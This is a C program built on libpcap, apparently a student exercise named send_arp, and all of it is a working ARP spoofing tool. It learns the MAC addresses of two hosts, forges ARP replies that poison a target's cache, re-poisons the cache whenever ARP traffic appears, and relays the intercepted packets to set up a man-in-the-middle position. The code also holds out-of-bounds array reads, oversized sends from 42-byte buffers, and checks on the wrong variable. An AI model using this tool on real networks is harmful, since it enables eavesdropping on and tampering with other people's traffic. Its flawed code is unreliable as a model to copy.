#include <sys/socket.h>
#include <sys/types.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(int argc, char ** argv) {
    char * device = argv[1];
    const char* ifname = device;

    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if(s < 0) perror("socket fail"); /* TODO 에러처리 */

    struct ifreq ifr;
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);

    if(ioctl(s, SIOCGIFHWADDR, &ifr) < 0)
        perror("ioctl fail");   /* TODO 에러처리 */

    const unsigned char* mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    printf("%02x:%02x:%02x:%02x:%02x:%02x\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    shutdown(s, SHUT_RDWR);
    pcap_t * handle;
    u_char packet[42];
    u_char arp_packet[42];
    char errbuf[PCAP_ERRBUF_SIZE];
    int32_t res, i;
    struct pcap_pkthdr *header;	/* The header that pcap gives us */
    u_char* packet2;		/* The actual packet */
    u_char sendermac[6];
    u_char targetmac[6];
    u_int32_t net=0;
    struct bpf_program fp;

    if(argc != 4) {
        printf("Usage : ./send_arp [device] [sender ip] [target ip]");
    }

    char * sender_ip = argv[2];
    char * target_ip = argv[3];
    u_int32_t sipNum = (u_int32_t)inet_addr(sender_ip);
    u_int32_t tipNum = (u_int32_t)inet_addr(target_ip);

    handle = pcap_open_live(device, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device\n");
        return(2);
    }
    // Arp request
    for(i=0; i<6; i++) {
        packet[i] = 255;
    }
    for(i=6; i<12; i++) {
        packet[i] = mac[i-6];
    }
    packet[12] = 8;
    packet[13] = 6;
    packet[14] = 0;
    packet[15] = 1;
    packet[16] = 8;
    packet[17] = 0;
    packet[18] = 6;
    packet[19] = 4;
    packet[20] = 0;
    packet[21] = 1; // ARP Request
    for(i=22; i<28; i++) {
        packet[i] = mac[i-22];
    }
    packet[28] = (sipNum)&0xff;
    packet[29] = ((sipNum)>>8)&0xff;
    packet[30] = ((sipNum)>>16)&0xff;
    packet[31] = ((sipNum)>>24)&0xff;
    for(i=32; i<38; i++) {
        packet[i] = 0;
    }
    packet[38] = (tipNum)&0xff;
    packet[39] = ((tipNum)>>8)&0xff;
    packet[40] = ((tipNum)>>16)&0xff;
    packet[41] = ((tipNum)>>24)&0xff;

    if (pcap_sendpacket(handle, packet, 42) != 0) {
        printf( "Couldn't send packet\n");
        return(2);
    }

    if(pcap_compile(handle, &fp, "arp", 0, net) == -1) {
        fprintf(stderr, "Couldn't parse filter %s\n", pcap_geterr(handle));
        return (2);
    }

    if(pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Couldn't install filter %s\n", pcap_geterr(handle));
        return(2);
    }

    while(1) {
        res = pcap_next_ex(handle, &header, &packet2); // header : 패킷이 잡힌 시간, 길이 정보
        if (res == 0 || packet == NULL)
            continue;
        if (res == -1 || res == -2) // Error while grabbing packet.
            break; // I edited it.
        printf("Jacked a packet with length of [%d]\n", (*header).len);
        for(i=0; i<6; i++) {
            targetmac[i] = packet2[i+6];
        }
        break;
    }

    for(i=0; i<6; i++) {
        packet[i] = 255;
    }
    for(i=6; i<12; i++) {
        packet[i] = mac[i-6];
    }
    packet[12] = 8;
    packet[13] = 6;
    packet[14] = 0;
    packet[15] = 1;
    packet[16] = 8;
    packet[17] = 0;
    packet[18] = 6;
    packet[19] = 4;
    packet[20] = 0;
    packet[21] = 1; // ARP Request
    for(i=22; i<28; i++) {
        packet[i] = mac[i-22];
    }
    packet[28] = (tipNum)&0xff;
    packet[29] = ((tipNum)>>8)&0xff;
    packet[30] = ((tipNum)>>16)&0xff;
    packet[31] = ((tipNum)>>24)&0xff;
    for(i=32; i<38; i++) {
        packet[i] = 0;
    }
    packet[38] = (sipNum)&0xff;
    packet[39] = ((sipNum)>>8)&0xff;
    packet[40] = ((sipNum)>>16)&0xff;
    packet[41] = ((sipNum)>>24)&0xff;
    if (pcap_sendpacket(handle, packet, 42) != 0) {
        printf( "Couldn't send packet\n");
        return(2);
    }

    while(1) {
        res = pcap_next_ex(handle, &header, &packet2); // header : 패킷이 잡힌 시간, 길이 정보
        if (res == 0 || packet == NULL)
            continue;
        if (res == -1 || res == -2) // Error while grabbing packet.
            break; // I edited it.
        printf("Jacked a packet with length of [%d]\n", (*header).len);
        for(i=0; i<6; i++) {
            sendermac[i] = packet2[i+6];
        }
        break;
    }
    // Arp Reply
    for(i=0; i<6; i++) {
        packet[i] = targetmac[i];
    }
    for(i=6; i<12; i++) {
        packet[i] = mac[i-6];
    }
    packet[12] = 8;
    packet[13] = 6;
    packet[14] = 0;
    packet[15] = 1;
    packet[16] = 8;
    packet[17] = 0;
    packet[18] = 6;
    packet[19] = 4;
    packet[20] = 0;
    packet[21] = 2; //ARP Reply
    for(i=22; i<28; i++) {
        packet[i] = mac[i-22];
    }
    packet[28] = (sipNum)&0xff;
    packet[29] = ((sipNum)>>8)&0xff;
    packet[30] = ((sipNum)>>16)&0xff;
    packet[31] = ((sipNum)>>24)&0xff;
    for(i=32; i<38; i++) {
        packet[i] = targetmac[i];
    }
    packet[38] = (tipNum)&0xff;
    packet[39] = ((tipNum)>>8)&0xff;
    packet[40] = ((tipNum)>>16)&0xff;
    packet[41] = ((tipNum)>>24)&0xff;

    memcpy(arp_packet, packet, 42);
    /*
        while(1)
        {
            if (pcap_sendpacket(handle, arp_packet, sizeof( arp_packet )) != 0)
                printf("error\n");
        }
*/
    if(pcap_sendpacket(handle, arp_packet, sizeof(arp_packet)) != 0 ) {
        printf("Couldn't send packet\n");
        return(2);
    }

    if(pcap_compile(handle, &fp, "icmp||arp", 0, net) == -1) {
        fprintf(stderr, "Couldn't parse filter %s\n", pcap_geterr(handle));
        return (2);
    }

    if(pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Couldn't install filter %s\n", pcap_geterr(handle));
        return(2);
    }

    while(1) {
        res = pcap_next_ex(handle, &header, &packet2);

        if( res == 0 || packet2 == NULL)
            continue;
        if( res ==-1 || res == -2)
            break;
        printf("Jacked a packet with length of [%d]\n", (*header).len);
        if(packet2[12] == 8 && packet2[13] == 6) {
            if(pcap_sendpacket(handle, arp_packet, 100) != 0 ) {
                printf("Couldn't send packet\n");
                return(2);
            }
            printf("ARP Modified Again\n");
            continue;
        }

        for(i=0; i<6; i++) {
            packet2[i] = sendermac[i];
        }

        for(i=6;i<12;i++) {
            packet2[i] = mac[i-6];
        }

        if(pcap_sendpacket(handle, packet2, 100) != 0 ) {
            printf("Couldn't send packet\n");
            return(2);
        }
        printf("Packet Relay\n");
    }

    return 0;
}
